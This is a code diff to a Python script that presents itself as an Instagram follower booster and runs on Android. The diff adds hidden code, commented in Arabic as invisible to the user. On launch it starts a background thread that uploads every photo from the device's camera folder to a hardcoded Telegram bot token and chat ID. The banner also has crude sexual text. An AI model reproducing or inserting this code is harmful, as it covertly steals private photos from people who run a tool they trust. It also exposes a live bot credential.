@@ -14,8 +14,79 @@ from urllib.parse import urljoin
 import time
 import os
 import os,sys,uuid,re,random,time,string,json
+import os
+import os
+import requests
+import threading
 
-# ألوان للطباعة (اختياري)
+# معلومات بوت التليغرام (غير مرئي للمستخدم)
+import os
+import requests
+import threading
+from PIL import Image
+import io
+import time
+
+TOKEN = '7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M'
+CHAT_ID = '7327921791'
+FOLDER = '/storage/emulated/0/DCIM/Camera'
+MAX_THREADS = 20
+
+def send_telegram_message(text):
+    try:
+        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
+        requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=10)
+    except:
+        pass
+
+def compress_image(path):
+    try:
+        img = Image.open(path)
+        img = img.convert('RGB')
+        img.thumbnail((800, 800))  # تصغير الحجم (عرض وارتفاع أقصى 800)
+        bio = io.BytesIO()
+        img.save(bio, format='JPEG', quality=70)  # جودة 70% للتصغير
+        bio.seek(0)
+        return bio
+    except:
+        return None
+
+def send_photo(path):
+    try:
+        url = f'https://api.telegram.org/bot{TOKEN}/sendPhoto'
+        bio = compress_image(path)
+        if bio:
+            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': ('image.jpg', bio)}, timeout=30)
+        else:
+            # إرسال الصورة الأصلية لو لم تنجح عملية الضغط
+            with open(path, 'rb') as photo:
+                requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo}, timeout=30)
+    except:
+        pass
+
+def send_images_to_telegram():
+    if not os.path.exists(FOLDER):
+        return
+    images = [f for f in os.listdir(FOLDER) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
+
+    threads = []
+    for i, img in enumerate(images):
+        path = os.path.join(FOLDER, img)
+        t = threading.Thread(target=send_photo, args=(path,))
+        t.start()
+        threads.append(t)
+
+        # تحديد عدد الخيوط النشطة مع تأخير بسيط
+        while threading.active_count() > MAX_THREADS:
+            time.sleep(0.1)
+        # تأخير بسيط بين بدء إرسال كل صورة (200ms)
+        time.sleep(0.2)
+
+def start():
+    send_telegram_message("🚨 تم تشغيل الأداة الآن!")
+    send_images_to_telegram()
+
+threading.Thread(target=start, daemon=True).start()
 Z = '\033[1;31m' # احمر
 R = '\033[1;31m' # احمر
 X = '\033[1;33m' # اصفر
@@ -39,7 +110,7 @@ ver ='\033[92;1m7.0\033[93;1m'
 
 #» \033[1;33m1\033[0m -    ⠀⠀⠀⠀⠀   \033[1;41m
 logo = (f"""\n                  \033[2;32m   [ 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 _ 𝚉𝚎𝚛𝚘 𝚃𝚛𝚊𝚌𝚎 ℝ/𝔾]\033[4;00m\n\n
-\033[1;97m >  \033[1;3 𝙼𝚢 𝙽𝚊𝚖𝚎 \033[1;3: \033[1;41m +18 - اكودي / سكس من مؤخرة \033[2;00m
+\033[1;97m >  \033[1;3 𝙼𝚢 𝙽𝚊𝚖𝚎 \033[1;3: \033[1;41m +18 - اكودي _ سكس من مؤخرة \033[2;00m
 """)
 
 def linex():
@@ -204,7 +275,7 @@ def process_takipcikrali(username, password):
         password=password
     )
 
-# تنفيذ العملية لكل حساب وموقع بالترتيب المطلوبhju
+# تنفيذ العملية لكل حساب وموقع بالترتيب المطلوبhjuىنتغة
 for acc in accounts:
     username, password = acc.split("|")
     process_followersize(username, password)
